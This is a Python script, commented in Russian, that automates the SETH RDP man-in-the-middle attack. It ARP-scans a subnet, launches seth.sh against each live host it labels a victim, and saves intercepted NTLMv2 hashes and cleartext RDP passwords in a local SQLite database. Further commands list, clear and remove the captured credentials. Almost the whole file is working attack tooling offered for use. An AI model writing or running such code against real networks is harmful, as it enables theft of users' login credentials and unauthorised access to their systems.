# Стандартные библиотеки
import argparse  # Для разбора аргументов командной строки
import subprocess  # Для выполнения команд в оболочке
import socket  # Для работы с сетевыми соединениями
import os  # Для взаимодействия с операционной системой
import sys  # Для доступа к системным параметрам и функциям
import threading  # Для создания и управления потоками
import sqlite3  # Для работы с базой данных SQLite

# Внешние библиотеки
import psutil  # Для работы с системными и процессными утилитами
from concurrent.futures import ThreadPoolExecutor, as_completed  # Для управления потоками
from tabulate import tabulate  # Для вывода в таблицы
from colorama import Fore, Style  # Для цветов в консоли
from scapy.all import ARP, Ether, srp, conf


def db_create():
    """
    Создает базу данных и таблицы, если они не существуют.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captured (
            IP VARCHAR PRIMARY KEY
        )
    ''')
    cursor.execute('''
            CREATE TABLE IF NOT EXISTS ntlmv2 (
                IP VARCHAR PRIMARY KEY,
                username VARCHAR,
                hash VARCHAR(64)
            )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS cleartext (
            IP VARCHAR PRIMARY KEY,
            username VARCHAR,
            password VARCHAR
        )
    ''')
    conn.commit()
    conn.close()


def db_get_captured():
    """
    Получает список всех захваченных IP-адресов из таблицы captured.

    :return: Множество захваченных IP-адресов.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('SELECT IP FROM captured')
    captured_ips = {row[0] for row in cursor.fetchall()}
    conn.close()
    return captured_ips


def db_add_captured(victim_ip):
    """
    Добавляет захваченный IP-адрес в таблицу captured, если он не существует.

    :param victim_ip: IP-адрес жертвы.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO captured (IP) VALUES (?)', (victim_ip,))
    conn.commit()
    conn.close()


def db_remove_data(victim_ip):
    """
    Удаляет записи с указанным IP-адресом из таблиц ntlmv2 и cleartext.

    :param victim_ip: IP-адрес жертвы.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM ntlmv2 WHERE IP = ?', (victim_ip,))
    cursor.execute('DELETE FROM cleartext WHERE IP = ?', (victim_ip,))
    conn.commit()
    conn.close()


def db_remove_victim(victim_ip):
    """
    Удаляет записи с IP-адресом жертвы.

    :param victim_ip: IP-адрес жертвы.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM captured WHERE IP = ?', (victim_ip,))
    cursor.execute('DELETE FROM ntlmv2 WHERE IP = ?', (victim_ip,))
    cursor.execute('DELETE FROM cleartext WHERE IP = ?', (victim_ip,))
    conn.commit()
    conn.close()


def db_get_data(victim_ip):
    """
    Получает данные (хэши и пароли) для указанного IP-адреса из таблиц ntlmv2 и cleartext.

    :param victim_ip: IP-адрес жертвы.
    :return: Кортеж списков хэшей и паролей.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()

    # Чтение хэшей из таблицы ntlmv2
    cursor.execute('SELECT hash FROM ntlmv2 WHERE IP = ?', (victim_ip,))
    username_ntlm = cursor.fetchall()
    cursor.execute('SELECT username FROM ntlmv2 WHERE IP = ?', (victim_ip,))
    hashes = cursor.fetchall()


    # Чтение паролей из таблицы cleartext
    cursor.execute('SELECT username FROM cleartext WHERE IP = ?', (victim_ip,))
    username_cleartext = cursor.fetchall()
    cursor.execute('SELECT password FROM cleartext WHERE IP = ?', (victim_ip,))
    passwords = cursor.fetchall()

    conn.close()

    return [username_ntlm, hashes], [username_cleartext, passwords]


def db_add_data(victim_ip, victim_hash=None, victim_password=None):
    """
    Добавляет хэш и/или пароль для указанного IP-адреса в соответствующие таблицы.

    :param victim_ip: IP-адрес жертвы.
    :param victim_hash: Хэш (если имеется).
    :param victim_password: Пароль (если имеется).
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()

    if victim_hash:
        username = victim_hash.split(':')[0]
        victim_hash = victim_hash.split(':')[3]
        cursor.execute(
            'INSERT OR REPLACE INTO ntlmv2 (IP, username, hash) VALUES (?, ?, ?)',
            (victim_ip, username, victim_hash))
    if victim_password:
        username = victim_password.split(':')[0].split('\\')[1]
        victim_password = victim_password.split(':')[1]
        cursor.execute(
            'INSERT OR REPLACE INTO cleartext (IP, username, password) VALUES (?, ?, ?)',
            (victim_ip, username, victim_password))

    conn.commit()
    conn.close()


def db_data_get_all():
    """
    Выводит содержимое таблицы cleartext.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('SELECT IP, username, password FROM cleartext')
    rows = cursor.fetchall()
    conn.close()

    if rows:
        table_data = [[row[0], row[1], row[2]] for row in rows]
        print(tabulate(table_data, headers=[f"{Fore.BLUE}IP{Style.RESET_ALL}", f"{Fore.BLUE}Имя пользователя{Style.RESET_ALL}", f"{Fore.BLUE}Пароль{Style.RESET_ALL}"], tablefmt="fancy_grid"))
    else:
        print("Таблица cleartext пуста.")


def db_clear():
    """
    Очищает все таблицы в базе данных.
    """
    conn = sqlite3.connect('seth.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM captured')
    cursor.execute('DELETE FROM ntlmv2')
    cursor.execute('DELETE FROM cleartext')
    conn.commit()
    conn.close()
    print("База данных очищена.")


def get_ip_address(interface):
    """
    Получает IP-адрес для заданного сетевого интерфейса.

    :param interface: Имя сетевого интерфейса (например, "eth0").
    :return: IP-адрес интерфейса.
    :raises ValueError: Если IP-адрес не найден для интерфейса.
    """
    addresses = psutil.net_if_addrs()

    if interface not in addresses:
        raise ValueError(f"Интерфейс {interface} не найден")

    for addr in addresses[interface]:
        if addr.family == socket.AF_INET:
            return addr.address

    raise ValueError(f"IP-адрес не найден для интерфейса {interface}")


def scan_network(interface, subnet):
    """
    Сканирует локальную сеть и возвращает список активных IP-адресов.

    :param interface: Интерфейс
    :param subnet: Подсеть для сканирования.
    :return: Список активных IP-адресов.
    """
    if interface:
        conf.iface = interface
    # Создаем ARP-запрос для указанной подсети
    arp_request = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    # Отправляем пакет и получаем ответы
    result = srp(packet, timeout=2, verbose=0)[0]

    # Извлекаем IP-адреса из ответов
    active_ips = [rcv.psrc for sent, rcv in result]
    return active_ips


def run_seth(interface, attacker_ip, victim_ip, gateway_ip, stop_event):
    """
    Запускает SETH на указанном IP жертвы и обрабатывает вывод.

    :param interface: Сетевой интерфейс.
    :param attacker_ip: IP-адрес атакующего.
    :param victim_ip: IP-адрес жертвы.
    :param gateway_ip: IP-адрес шлюза.
    :param stop_event: Событие для остановки потоков.
    """
    process = subprocess.Popen(
        ["./seth.sh", interface, attacker_ip, victim_ip, gateway_ip],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    while not stop_event.is_set():
        line = process.stdout.readline()
        if line and "Got it" in line:
            print(f"\n\033[92mПолучено соединение от {victim_ip}:\033[0m")
            db_remove_data(victim_ip=victim_ip)
            db_add_captured(victim_ip=victim_ip)
            stop_event.set()
            monitor_process(process=process, victim_ip=victim_ip)
            return

        if process.poll() is not None:
            break


def monitor_process(process, victim_ip):
    """
    Мониторит процесс SETH и обрабатывает вывод.

    :param process: Процесс SETH.
    :param victim_ip: IP-адрес жертвы.
    """

    def print_credentials():
        victim_hashes, victim_passwords = db_get_data(victim_ip)
        for username_password, victim_password in zip(victim_passwords[0], victim_passwords[1]):
            table_data = []
            if victim_password[0].strip():
                table_data.append([
                    f"{Fore.YELLOW}Пользователь{Style.RESET_ALL}",
                    f"{Fore.GREEN}{username_password[0].strip()}{Style.RESET_ALL}"])
                table_data.append([
                    f"{Fore.YELLOW}Пароль{Style.RESET_ALL}",
                    f"{Fore.GREEN}{victim_password[0].strip()}{Style.RESET_ALL}"])
            if table_data:
                print(tabulate(table_data, headers=[f"{Fore.BLUE}Параметр{Style.RESET_ALL}",
                                                    f"{Fore.BLUE}Значение{Style.RESET_ALL}"], tablefmt="fancy_grid"))

    while True:
        line = process.stdout.readline()
        if not line:
            if process.poll() is not None:
                break
            continue

        if 'Done' in line or 'Cleaning up' in line:
            print_credentials()
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)


def main():
    # Проверка, запущен ли скрипт от имени root
    if os.geteuid() != 0:
        os.execvp('sudo', ['sudo', 'python3'] + sys.argv)

    # Определение аргументов командной строки
    parser = argparse.ArgumentParser(description="Automate SETH execution")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # Подкоманда для MITM
    mitm_parser = subparsers.add_parser('mitm', help='Запуск SETH на указанную подсеть')
    mitm_parser.add_argument('-i', '--interface', required=True, help="Сетевой интерфейс")
    mitm_parser.add_argument('-s', '--subnet', required=True, help="Подсеть или одиночный IP для прослушивания")
    mitm_parser.add_argument('-r', '--server', required=True, help="RDP сервер")

    # Подкоманда для show
    subparsers.add_parser('show', help='Вывод всех паролей')

    # Подкоманда для clear
    subparsers.add_parser('clear', help='Очистка базы данных')

    # Подкоманда для remove
    remove_parser = subparsers.add_parser('remove', help='Удаление определенного IP-адреса')
    remove_parser.add_argument('ip', help="IP-адрес для удаления")

    args = parser.parse_args()

    # Подключаемся к базе данных и создаем таблицы
    db_create()

    # Для параметра mitm
    if args.command == 'mitm':
        interface = args.interface
        attacker_ip = get_ip_address(interface)
        subnet = args.subnet
        server = args.server

        # Вывод исходных данных в виде таблицы
        table_data = [
            [f"{Fore.YELLOW}Интерфейс{Style.RESET_ALL}", interface],
            [f"{Fore.YELLOW}IP атакующего{Style.RESET_ALL}", attacker_ip],
            [f"{Fore.YELLOW}Подсеть{Style.RESET_ALL}", subnet],
            [f"{Fore.YELLOW}RDP сервер{Style.RESET_ALL}", server]
        ]

        # Вывод таблицы
        print(tabulate(table_data,
                       headers=[f"{Fore.MAGENTA}Параметр{Style.RESET_ALL}", f"{Fore.MAGENTA}Значение{Style.RESET_ALL}"],
                       tablefmt="fancy_grid"))

        # Сканирование подсети с помощью nmap
        print(f"\n{Fore.YELLOW}Идет сканирование подсети...{Style.RESET_ALL}")
        active_ips = scan_network(interface, subnet)

        # Разбор вывода nmap для поиска действительных IP-адресов
        valid_ips = [ip for ip in active_ips if ip not in {attacker_ip, server}]

        # Исключение IP-адреса атакующего и сервера из списка действительных IP-адресов
        valid_ips = [ip for ip in valid_ips if ip not in {attacker_ip, server}]

        # Исключение ранее захваченных жертв из списка действительных IP-адресов
        valid_ips = [ip for ip in valid_ips if ip not in db_get_captured()]

        # Определение максимального количества рабочих потоков на основе количества действительных IP-адресов
        max_workers = len(valid_ips)
        print(f"\n{Fore.CYAN}Запуск SETH на {max_workers} IP{Style.RESET_ALL}")

        # Создание события для остановки потоков
        stop_event = threading.Event()

        # Запуск SETH на каждом действительном IP с использованием ThreadPoolExecutor для обработки конкурентных задач
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                [future.result() for future in as_completed(
                    executor.submit(run_seth, interface, attacker_ip, victim_ip, server, stop_event) for victim_ip in
                    valid_ips)]
        except (KeyboardInterrupt, Exception):
            os.system('clear')
    # Показывает все пароли
    elif args.command == 'show':
        db_data_get_all()
    # Очистка всех данных
    elif args.command == 'clear':
        db_clear()
    # Удаление определенного IP
    elif args.command == 'remove':
        db_remove_victim(args.ip)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        os.system('clear')
